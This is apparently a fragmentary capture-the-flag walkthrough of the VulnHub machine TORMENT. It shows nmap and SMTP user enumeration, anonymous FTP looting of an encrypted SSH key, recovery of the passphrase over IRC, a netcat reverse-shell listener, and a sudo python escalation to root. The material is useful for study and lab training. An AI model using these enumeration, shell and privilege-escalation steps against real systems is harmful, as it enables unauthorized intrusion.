https://www.hackingarticles.in/digitalworld-localtorment-vulnhub-walkthrough/
https://www.programmersought.com/article/22685205500/


This is the evil twin of JOY. Unlike JOY, this machine is designed to drive you crazy. Stephen Hawking once mentioned, "God plays dice and throws them into places where they cannot be seen."

The dice for the machine can all be found on the Internet. Like all other machines built by me, you should not torment yourself by brute force. But perhaps, JOY and TORMENT are two sides of the same coin of satisfaction? Can we really spark joy if we can't first be tormented to endure sufferance?

This machine guarantees to teach you some new ways of looking at enumeration and exploitation. Unlike all the other OSCP-like machines written by me, this machine will be mind-twisting and maybe mind-blowing. You may lose your mind while at it, but we will still nudge you to... try harder!

This is NOT an easy machine and you should not feel discouraged if you spend a few days headbanging on this machine. At least three competent pentesters I have asked to test this machine report days (thankfully not weeks) of head banging and nerve wrecking. Do this machine if you enjoy being humbled.

If you MUST have hints for this machine (even though they will probably not help you very much until you root the box!): Torment is (#1): what happens when you can't find your answer on Google, even though it's there, (#2): what happens when you plead for mercy, but do not succeed, (#3): https://www.youtube.com/watch?v=7ge1yWot4cE

Feel free to contact the author at https://donavan.sg/blog if you would like to drop a comment.



    └─$ sudo nmap -sT -A -Pn -n -p- 192.168.110.21
    Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
    Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-22 06:51 CEST
    Nmap scan report for 192.168.110.21
    Host is up (0.00021s latency).
    Not shown: 65516 closed ports
    PORT      STATE SERVICE     VERSION
    21/tcp    open  ftp         vsftpd 2.0.8 or later
    | ftp-anon: Anonymous FTP login allowed (FTP code 230)
    | -rw-r--r--    1 ftp      ftp        112640 Dec 28  2018 alternatives.tar.0
    | -rw-r--r--    1 ftp      ftp          4984 Dec 23  2018 alternatives.tar.1.gz
    | -rw-r--r--    1 ftp      ftp         95760 Dec 28  2018 apt.extended_states.0
    | -rw-r--r--    1 ftp      ftp         10513 Dec 27  2018 apt.extended_states.1.gz
    | -rw-r--r--    1 ftp      ftp         10437 Dec 26  2018 apt.extended_states.2.gz
    | -rw-r--r--    1 ftp      ftp           559 Dec 23  2018 dpkg.diversions.0
    | -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.1.gz
    | -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.2.gz
    | -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.3.gz
    | -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.4.gz
    | -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.5.gz
    | -rw-r--r--    1 ftp      ftp           229 Dec 23  2018 dpkg.diversions.6.gz
    | -rw-r--r--    1 ftp      ftp           505 Dec 28  2018 dpkg.statoverride.0
    | -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.1.gz
    | -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.2.gz
    | -rw-r--r--    1 ftp      ftp           295 Dec 28  2018 dpkg.statoverride.3.gz
    | -rw-r--r--    1 ftp      ftp           281 Dec 27  2018 dpkg.statoverride.4.gz
    | -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.5.gz
    | -rw-r--r--    1 ftp      ftp           208 Dec 23  2018 dpkg.statoverride.6.gz
    | -rw-r--r--    1 ftp      ftp       1719127 Jan 01  2019 dpkg.status.0
    |_Only 20 shown. Use --script-args ftp-anon.maxlist=-1 to see all.
    | ftp-syst: 
    |   STAT: 
    | FTP server status:
    |      Connected to ::ffff:192.168.110.1
    |      Logged in as ftp
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |      TYPE: ASCII
    |      No session bandwidth limit
    |      Session timeout in seconds is 300
    |      Control connection is plain text
    |      Data connections will be plain text
    |      At session startup, client count was 1
    |      vsFTPd 3.0.3 - secure, fast, stable
    |_End of status
    22/tcp    open  ssh         OpenSSH 7.4p1 Debian 10+deb9u4 (protocol 2.0)
    | ssh-hostkey: 
    |   2048 84:c7:31:7a:21:7d:10:d3:a9:9c:73:c2:c2:2d:d6:77 (RSA)
    |   256 a5:12:e7:7f:f0:17:ce:f1:6a:a5:bc:1f:69:ac:14:04 (ECDSA)
    |_  256 66:c7:d0:be:8d:9d:9f:bf:78:67:d2:bc:cc:7d:33:b9 (ED25519)
    25/tcp    open  smtp        Postfix smtpd
    |_smtp-commands: TORMENT.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, SMTPUTF8, 
    | ssl-cert: Subject: commonName=TORMENT
    | Subject Alternative Name: DNS:TORMENT
    | Not valid before: 2018-12-23T14:28:47
    |_Not valid after:  2028-12-20T14:28:47
    |_ssl-date: TLS randomness does not represent time
    80/tcp    open  http        Apache httpd 2.4.25
    |_http-server-header: Apache/2.4.25
    |_http-title: Apache2 Debian Default Page: It works
    111/tcp   open  rpcbind     2-4 (RPC #100000)
    | rpcinfo: 
    |   program version    port/proto  service
    |   100000  2,3,4        111/tcp   rpcbind
    |   100000  2,3,4        111/udp   rpcbind
    |   100000  3,4          111/tcp6  rpcbind
    |   100000  3,4          111/udp6  rpcbind
    |   100003  3,4         2049/tcp   nfs
    |   100003  3,4         2049/tcp6  nfs
    |   100003  3,4         2049/udp   nfs
    |   100003  3,4         2049/udp6  nfs
    |   100005  1,2,3      56655/tcp6  mountd
    |   100005  1,2,3      57609/tcp   mountd
    |   100005  1,2,3      59344/udp6  mountd
    |   100005  1,2,3      60638/udp   mountd
    |   100021  1,3,4      35675/tcp6  nlockmgr
    |   100021  1,3,4      39182/udp   nlockmgr
    |   100021  1,3,4      40551/udp6  nlockmgr
    |   100021  1,3,4      44223/tcp   nlockmgr
    |   100227  3           2049/tcp   nfs_acl
    |   100227  3           2049/tcp6  nfs_acl
    |   100227  3           2049/udp   nfs_acl
    |_  100227  3           2049/udp6  nfs_acl
    139/tcp   open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    143/tcp   open  imap        Dovecot imapd
    |_imap-capabilities: IDLE more ID post-login have listed LITERAL+ LOGIN-REFERRALS ENABLE IMAP4rev1 AUTH=LOGINA0001 Pre-login OK SASL-IR capabilities AUTH=PLAIN
    445/tcp   open  netbios-ssn Samba smbd 4.5.12-Debian (workgroup: WORKGROUP)
    631/tcp   open  ipp         CUPS 2.2
    | http-methods: 
    |_  Potentially risky methods: PUT
    | http-robots.txt: 1 disallowed entry 
    |_/
    |_http-server-header: CUPS/2.2 IPP/2.1
    |_http-title: Home - CUPS 2.2.1
    2049/tcp  open  nfs_acl     3 (RPC #100227)
    6667/tcp  open  irc         ngircd
    6668/tcp  open  irc         ngircd
    6669/tcp  open  irc         ngircd
    6672/tcp  open  irc         ngircd
    6674/tcp  open  irc         ngircd
    34237/tcp open  mountd      1-3 (RPC #100005)
    37887/tcp open  mountd      1-3 (RPC #100005)
    44223/tcp open  nlockmgr    1-4 (RPC #100021)
    57609/tcp open  mountd      1-3 (RPC #100005)
    MAC Address: 08:00:27:70:91:97 (Oracle VirtualBox virtual NIC)
    Device type: general purpose
    Running: Linux 3.X|4.X
    OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
    OS details: Linux 3.2 - 4.9
    Network Distance: 1 hop
    Service Info: Hosts:  TORMENT.localdomain, TORMENT, irc.example.net; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Host script results:
    |_clock-skew: mean: -40m01s, deviation: 4h37m07s, median: 1h59m58s
    |_nbstat: NetBIOS name: TORMENT, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
    | smb-os-discovery: 
    |   OS: Windows 6.1 (Samba 4.5.12-Debian)
    |   Computer name: torment
    |   NetBIOS computer name: TORMENT\x00
    |   Domain name: \x00
    |   FQDN: torment
    |_  System time: 2021-04-22T14:52:02+08:00
    | smb-security-mode: 
    |   account_used: guest
    |   authentication_level: user
    |   challenge_response: supported
    |_  message_signing: disabled (dangerous, but default)
    | smb2-security-mode: 
    |   2.02: 
    |_    Message signing enabled but not required
    | smb2-time: 
    |   date: 2021-04-22T06:52:02
    |_  start_date: N/A

    TRACEROUTE
    HOP RTT     ADDRESS
    1   0.21 ms 192.168.110.21

    OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 39.00 seconds

└─$ wget -m ftp://anonymous:anonymous@192.168.110.21 


┌──(kali㉿kali)-[~/…/boxes/torment/ftp/192.168.110.21]
└─$ ls -al .ssh                
total 16
drwxr-xr-x  2 kali kali 4096 Apr 22 09:24 .
drwxr-xr-x 11 kali kali 4096 Apr 22 09:24 ..
-rw-r--r--  1 kali kali 1766 Jan  4  2019 id_rsa
-rw-r--r--  1 kali kali  183 Apr 22 09:24 .listing
                                                                                                
┌──(kali㉿kali)-[~/…/boxes/torment/ftp/192.168.110.21]
└─$ ls -al .ngircd 
total 16
drwxr-xr-x  2 kali kali 4096 Apr 22 09:24 .
drwxr-xr-x 11 kali kali 4096 Apr 22 09:24 ..
-rw-r--r--  1 kali kali   33 Jan  4  2019 channels
-rw-r--r--  1 kali kali  185 Apr 22 09:24 .listing

└─$ cat 192.168.110.21/.ngircd/channels
channels:
games
tormentedprinter


└─$ cat 192.168.110.21/.ssh/id_rsa     
-----BEGIN RSA PRIVATE KEY-----
Proc-Type: 4,ENCRYPTED
DEK-Info: AES-128-CBC,C37F0C31D1560056EA1F9204EC405986

U9X/cW7GIiI48TQAzUs5ozEQgexHKiFi2NcoADhs/ax/CTJvZh32k+izzW0mMzl1
mo5HID0qNghIbVbRcN6Zv8cdJ/AhREjy25YZ68zA7GWoyfoch1K/XY0NEnNTchLf
b6k5GEgu5jfQT+pAj1A6jQyzz4A4CGbvD+iEEJRX3qsTlAn6th6dniRORJggnVLB
K4ONTeP4US7GSGTtOD+hwoyoR4zNQKT2Hn/WryoF7LdAXMwf1aNJJJ7YPz1YdSnU
fxXscbOMlXuZ4ouawIVGeYeH85lmOh7aBy5MWsYq/vNC+2pVzVEkRfc6jug1UbdG
hncWxfU92Q47lVuqtc4HPINynD2Q8rBlYrKsEbPqtLyCnBGM/T0Srzztj+IjXUD1
SdbVLmxascquwnIyv2w55vjwJv5dKjLBmrDiY0Doc9YYCGi6cz1p9tsE+G+uRg0r
hGuFXldsYEkoQcJ4iWjsYiqcwWWFfkN+A0rYXqqcDY+aqAy+jXkhyzfmUp3KBz9j
CjR1+7KcmKvNXtjn8V+iv2Nwf+qc2YzBNkBWlwHhxIz6L8F3k3OkqnZUqPKCW2Ga
CNMcIYx3+Gde3aXpHXg4OFALV7y23N8A2h97VOqnnrnED46C39shkA8iiMNdH9mz
87TWgw+wPLbWXJO7G5nJL0qciLV/Eo6atSof3FUx/4WX4fmYeg1Rdy0KgTC1NRGn
VT/YnlBrNW3f7fdhk/YhHbcT9vCg9/Nm3hmzQX/FBP085SgeEA+ebNMzQwPmqcfb
jGpMPdhD7iLmKPwQL3RFTVODjUyzsgJ6kz83aQd80qPClopqp4NFMLwATVpbN858
d4Q0QQGrCRqu2SYaYmVhGo37BJXKE11y0JzWXOhiVLD0I9fBoHDmsKHN4Aw3lbVE
/n+B0Qa1bIMGfXP7J4r7/+4trQCGi7ngVfhtygtg6j/HcoXDy9y15zrHZqKerWd6
6ApM1caan4T0FjqlqTOQsN5GmB9sBCu02VQ1QF3Z4FVA9oW+pkNFxAeKIddG1yLM
5L1ePDgEYjik6vM1lE/65c7fNaO8dndMau4reUnPbTFqKsTA46uUaMyOV6S7nsys
kHGcAXLEzvbC8ojK1Pg5Llok6f8YN+H7cP6vE1yCfx3oU3GdWV36AgBWLON8+Wwc
icoyqfW6E2I0xz5nlHoea/7szCNBI4wZmRI+GRcRgegQvG06QvdXNzjqdezbb4ba
EXRnMddmfjFSihlUhsKxLhCmbaJk5mG2oGLHQcOurvOUPh/qgRBfUf3PTntuUoa0
0+tGGaLYibDNb5eXQ39Bsjzm8BWG/dSK/Qq7UU4Bk2bTKikWQLazPAy482BsZpWI
mXt8ISmJqldgdrtnVvG3zoQBQpspZ6HTojheNazfD4zzvduQguOcKrCNICxoSRgA
egRER+uxaLqNGz+6H+9sl7FYWalMa+VzjrEDU7PeZNgOj9PxLdKbstQLQxC/Zq6+
7kYu2pHwqP2HcXmdJ9xYnptwkuqh5WGR82Zk+JkKwUBEQJmbVxjqWLjCV/CDA06z
6VvrfrPo3xt/CoZkH66qcm9LCTcM3DsLs3UT4B7aH5wk4l5MmpVI4/mx2Dlv0Mkv
-----END RSA PRIVATE KEY-----


┌──(kali㉿kali)-[~/…/torment/ftp/192.168.110.21/.ssh]
└─$ ssh games@192.168.110.21 -i id_rsa 
The authenticity of host '192.168.110.21 (192.168.110.21)' can't be established.
ECDSA key fingerprint is SHA256:j4tPl3yMyRkAqU6jeez9Fdc9yMeUXdE7wAjddbafk/o.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.110.21' (ECDSA) to the list of known hosts.
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
Enter passphrase for key 'id_rsa': 
games@192.168.110.21: Permission denied (publickey).


└─$ enum4linux -a 192.168.110.21           
Starting enum4linux v0.8.9 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Thu Apr 22 09:28:20 2021

 ========================== 
|    Target Information    |
 ========================== 
Target ........... 192.168.110.21
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ====================================================== 
|    Enumerating Workgroup/Domain on 192.168.110.21    |
 ====================================================== 
[+] Got domain/workgroup name: WORKGROUP

 ============================================== 
|    Nbtstat Information for 192.168.110.21    |
 ============================================== 
Looking up status of 192.168.110.21
        TORMENT         <00> -         B <ACTIVE>  Workstation Service
        TORMENT         <03> -         B <ACTIVE>  Messenger Service
        TORMENT         <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        WORKGROUP       <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name
        WORKGROUP       <1d> -         B <ACTIVE>  Master Browser
        WORKGROUP       <1e> - <GROUP> B <ACTIVE>  Browser Service Elections

        MAC Address = 00-00-00-00-00-00

 ======================================= 
|    Session Check on 192.168.110.21    |
 ======================================= 
[E] Server doesn't allow session using username '', password ''.  Aborting remainder of tests.
 

<a href="/printers/Ethan's_Personal_Printer">Ethan's_Personal_Printer</a>

    curl -s http://192.168.110.21:631/printers/ \
    | grep '/printers/' \
    | awk -F '<A HREF="/printers/' '{print $2}' \
    | awk -F '&#39;s_Personal_Printer' '{print $1}' \
    | sed '1,2d' \
    | tr [A-Z] [a-z] \
    | cat -n



    └─$ nmap -p25 --script smtp-enum-users  --script-args smtp-enum-users.domain=TORMENT.localdomain,userdb=users.txt 192.168.110.63
    Starting Nmap 7.92 ( https://nmap.org ) at 2021-11-05 14:07 CET
    Nmap scan report for 192.168.110.63
    Host is up (0.00026s latency).

    PORT   STATE SERVICE
    25/tcp open  smtp
    | smtp-enum-users: 
    |   root
    |   patrick
    |_  qiu


    msf6 auxiliary(scanner/smtp/smtp_enum) > show options

    Module options (auxiliary/scanner/smtp/smtp_enum):

       Name       Current Setting            Required  Description
       ----       ---------------            --------  -----------
       RHOSTS                                yes       The target host(s), range CIDR identifier,
                                                       or hosts file with syntax 'file:<path>'
       RPORT      25                         yes       The target port (TCP)
       THREADS    1                          yes       The number of concurrent threads (max one p
                                                       er host)
       UNIXONLY   true                       yes       Skip Microsoft bannered servers when testin
                                                       g unix users
       USER_FILE  /usr/share/metasploit-fra  yes       The file that contains a list of probable u
                  mework/data/wordlists/uni            sers accounts.
                  x_users.txt

    msf6 auxiliary(scanner/smtp/smtp_enum) > set RHOSTS 192.168.110.21
    RHOSTS => 192.168.110.21
    msf6 auxiliary(scanner/smtp/smtp_enum) > set USER_FILE usernames.txt
    USER_FILE => usernames.txt
    msf6 auxiliary(scanner/smtp/smtp_enum) > run

    [*] 192.168.110.21:25     - 192.168.110.21:25 Banner: 220 TORMENT.localdomain ESMTP Postfix (Debian/GNU)
    [+] 192.168.110.21:25     - 192.168.110.21:25 Users found: patrick, qiu
    [*] 192.168.110.21:25     - Scanned 1 of 1 hosts (100% complete)
    [*] Auxiliary module execution completed


    └─$ /usr/share/legion/scripts/smtp-user-enum.pl -M VRFY -U users.txt -t 192.168.110.63
    Starting smtp-user-enum v1.2 ( http://pentestmonkey.net/tools/smtp-user-enum )

     ----------------------------------------------------------
    |                   Scan Information                       |
     ----------------------------------------------------------

    Mode ..................... VRFY
    Worker Processes ......... 5
    Usernames file ........... users.txt
    Target count ............. 1
    Username count ........... 16
    Target TCP port .......... 25
    Query timeout ............ 5 secs
    Target domain ............ 

    ######## Scan started at Fri Nov  5 14:38:09 2021 #########
    192.168.110.63: patrick exists
    192.168.110.63: root exists
    192.168.110.63: qiu exists
    ######## Scan completed at Fri Nov  5 14:38:09 2021 #########
    3 results.

    16 queries in 1 seconds (16.0 queries / sec)



smtp-user-enum -M VRFY -U users.txt -t 192.168.56.109
smtp-user-enum -M EXPN -U users.txt -t 192.168.56.109


HexChat > Networks > add > 192.168.110.21/6667 > Password default of ngircd is wealllikedebian (/etc/ngircd/ngircd.conf) >
 #tormentedprinter 
 
 ==>mostmachineshaveasupersecurekeyandalongpassphrase


https://null-byte.wonderhowto.com/how-to/crack-ssh-private-key-passwords-with-john-ripper-0302810/


    └─$ ssh patrick@192.168.110.21 -i id_rsa 
    Enter passphrase for key 'id_rsa': mostmachineshaveasupersecurekeyandalongpassphrase
    Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64

    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Fri Jan  4 19:34:43 2019 from 192.168.254.139
    patrick@TORMENT:~$ sudo -l
    Matching Defaults entries for patrick on TORMENT:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User patrick may run the following commands on TORMENT:
        (ALL) NOPASSWD: /bin/systemctl poweroff, /bin/systemctl halt, /bin/systemctl reboot



    patrick@TORMENT:~$ find /etc -writable 2>/dev/null
    /etc/systemd/system/samba-ad-dc.service
    /etc/apache2/apache2.conf

    cat /etc/apache2/apache2.conf
    ...
    User qiu 
    Group qiu 
    ...



    └─$ nc -nlvp 1234
    listening on [any] 1234 ...
    connect to [192.168.110.1] from (UNKNOWN) [192.168.110.21] 46622
    Linux TORMENT 4.9.0-8-amd64 #1 SMP Debian 4.9.130-2 (2018-10-27) x86_64 GNU/Linux
     16:53:23 up 1 min,  0 users,  load average: 0.27, 0.13, 0.05
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)
    /bin/sh: 0: can't access tty; job control turned off
    $ id
    uid=1000(qiu) gid=1000(qiu) groups=1000(qiu),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),113(bluetooth),114(lpadmin),118(scanner)
    $ python -c "import pty; pty.spawn('/bin/bash')"
    qiu@TORMENT:/$ sudo -l
    sudo -l
    Matching Defaults entries for qiu on TORMENT:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User qiu may run the following commands on TORMENT:
        (ALL) NOPASSWD: /usr/bin/python, /bin/systemctl

    echo "import os" > test.py
    echo "os.system('/bin/bash')" >> test.py

    qiu@TORMENT:/home/qiu$ sudo python test.py
    sudo python test.py
    root@TORMENT:/home/qiu# id
    id
    uid=0(root) gid=0(root) groups=0(root)


wealllikedebian